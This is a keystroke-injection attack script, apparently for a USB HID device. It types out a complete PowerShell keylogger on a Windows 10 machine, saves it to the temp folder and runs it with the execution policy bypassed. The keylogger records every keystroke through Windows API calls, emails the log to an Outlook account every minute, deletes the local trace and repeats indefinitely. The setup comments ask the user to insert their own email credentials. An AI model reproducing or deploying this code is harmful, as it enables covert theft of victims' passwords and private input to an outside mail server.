// =============================================================================
// Title: Keylogger to Email
// Author: @beigeworm | https://github.com/beigeworm
// Description: Log key presses for a set period of time and send to an email repetedly.
// Target: Windows 10
// =============================================================================

// *REQUIREMENTS*
// you will need a Microsoft Outlook Email address for this to work

// *SETUP*
// replace YOUR_EMAIL and YOUR_PASSWORD. (check entire script)
// set $runtime=1 to desired interval beetween emails (in minutes). Default is 1 minute.

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(1000);
type("notepad");
delay(200);
press("ENTER");
delay(3000);

// write main Powershell code in notepad
type("Do{$FromTo = \"YOUR_EMAIL\";$Pass = \"YOUR_PASSWORD\";$RunTime = 1;$TimesRun = 1;$getT = Get-Date;$Subj = \"$env:COMPUTERNAME : log Results\";$body = \"$env:COMPUTERNAME : Results : $strt\"");
press("ENTER");
delay(200);
type("$SMTP = \"smtp.outlook.com\";$Prt = \"587\";$Creds = new-object Management.Automation.PSCredential $FromTo, ($Pass | ConvertTo-SecureString -AsPlainText -Force)");
press("ENTER");
delay(200);
type("$Attachment = $strt = Get-Date;$end = $strt.addminutes($RunTime);function Start-Key($Path=\"$env:temp\\log.txt\"){$sigs = @'");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int GetKeyboardState(byte[] keystate);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int MapVirtualKey(uint uCode, int uMapType);");
press("ENTER");
delay(200);
type("[DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);");
press("ENTER");
delay(200);
type("'@");
press("ENTER");
delay(200);
type("$API = Add-Type -MemberDefinition $sigs -Name 'Win32' -Namespace API -PassThru;$null = New-Item -Path $Path -ItemType File -Force;try{$rnnr = 0;while ($TimesRun  -ge $rnnr){");
press("ENTER");
delay(200);
type("while ($end -ge $getT){Start-Sleep -Milliseconds 30;for($ascii = 9; $ascii -le 254; $ascii++){$state = $API::GetAsyncKeyState($ascii);if($state -eq -32767){$null = [console]::CapsLock");
press("ENTER");
delay(200);
type("$virtualKey = $API::MapVirtualKey($ascii, 3);$kbstate = New-Object Byte[] 256;$checkkbstate = $API::GetKeyboardState($kbstate);$mychar = New-Object -TypeName System.Text.StringBuilder");
press("ENTER");
delay(200);
type("$success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0);if($success){[System.IO.File]::AppendAllText($Path, $mychar, [System.Text.Encoding]::Unicode)}}}");
press("ENTER");
delay(200);
type("$getT = Get-Date};Sleep 3;send-mailmessage -from $FromTo -to $FromTo -subject $Subj -body $body -Attachment $Path -smtpServer $SMTP -port $Prt -credential $Creds -usessl");
press("ENTER");
delay(200);
type("Remove-Item -Path $Path -force}}finally{$null = New-Item -Path $Path -ItemType File -Force}}Start-Key}While ($a -le 5)");
press("ENTER");
delay(200);
press("CONTROL SHIFT s");
delay(1000);
type("%temp%");
delay(200);
press("ENTER");
delay(200);
type("txtlog.ps1");
press("TAB");
press("DOWN");
press("DOWN");
press("ENTER");
delay(200);
press("ENTER");
delay(500);
press("ALT F4");
delay(1000);

// start Powershell script
press("GUI r");
delay(1000);
type("powershell -NoP -NonI -Exec Bypass -C $env:temp;sleep 1;Start txtlog.ps1;sleep 1;exit");
delay(200);
press("ENTER");
delay(3000);
press("ALT y");